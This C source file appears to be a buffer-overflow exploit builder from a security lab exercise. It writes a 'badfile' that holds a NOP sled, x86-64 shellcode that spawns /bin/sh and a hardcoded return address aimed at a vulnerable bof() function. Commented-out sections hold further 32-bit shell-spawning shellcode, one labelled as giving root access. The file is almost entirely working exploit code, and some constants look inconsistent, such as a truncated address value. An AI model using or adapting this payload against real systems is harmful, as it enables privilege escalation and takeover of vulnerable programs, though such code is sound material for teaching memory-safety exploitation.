#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
shell code from article
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
*/


//shell code from exploit-db.com for shell
char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
  
// 8 bytes for ret
int sizeTargetBuff = 517, bitsFromMain = 1000;

int main(int argc, char **argv)
{
	char *ptr;
	long *addr_ptr;
	// create the file "badfile" 
	FILE *fp;
	fp = fopen("./badfile", "w+");
	
	// create a buffer filled with NOOP instructios
	char buf[sizeTargetBuff];
	memset(&buf, 0x90, sizeTargetBuff);

	// copy memory addr into buffer
	
	// location of $RBP @ bof stack frame
	long rbpbof = 0x7fffffffd790;
	
	// addr of buff in vuln.c:bof() 
	long bufaddr = 0x7fffffffd720;
	
	// location of $RIP @ bof stack frame
	long ripbof = 0x7fffffffd788;
	
	// Some address within the noop sled
	char addrnoop[] = "\xa0\xd7\xff\xff\xff\x7f"; 
	long noopaddr = 0x7fffffffd7;
		
	//  NOOP-sled -> shellcode -> [room for return address]
	
	//strcat(buf, shellcode);
	memcpy(buf + sizeof(buf) - sizeof(shellcode) - 1 - sizeof(noopaddr), shellcode, sizeof(shellcode));
	
	// NOOP-sled -> shellcode -> mem address within NOOP-sled
	memcpy(buf + sizeof(buf) - sizeof(noopaddr), &noopaddr, sizeof(long));
	
	/*
	ptr = buf;
	addr_ptr = (long *)ptr;
	int i;
	for (i = 0; i < 10; i++)
	{
		*(addr_ptr++) = noopaddr;
	}
	
	for (i = 0; i < strlen(shellcode); i++)
	{
		buf[sizeTargetBuff - (sizeof(shellcode) + 1) + i] = shellcode[i];
	}
	
	buf[sizeTargetBuff - 1] = '\0';
	*/
	
	
	
	// null char for end of string, end of buf
		

	// write into "badfile" and save the contents of buffer
	fwrite(buf, sizeTargetBuff, 1, fp);
	
	fclose (fp);
	
}
/*
// shell code to write correct data into mem
// this will open a terminal with root access
char shellcode[] = 
   "\x31\xc0"
   "\x50"
   "\x68""//sh"
   "\x68""/bin"
   "\x89\xe3"
   "\x50"
   "\x53"
   "\x89\xe1"
   "\x99"
   "\xb0\x0b"
   "\xcd\x80";
   */

/*
	int j = 0;
	// write instructions into buffer
	// size of return address = 7
	// size of shell code = 25
	// write return addr of bof() 10 times (70 bits total)
	for(i = (strlen(shellcode) - 1); i >= 0; i--)
	{
		buf[75 + j] = shellcode[i];
		j++;
	}
*/
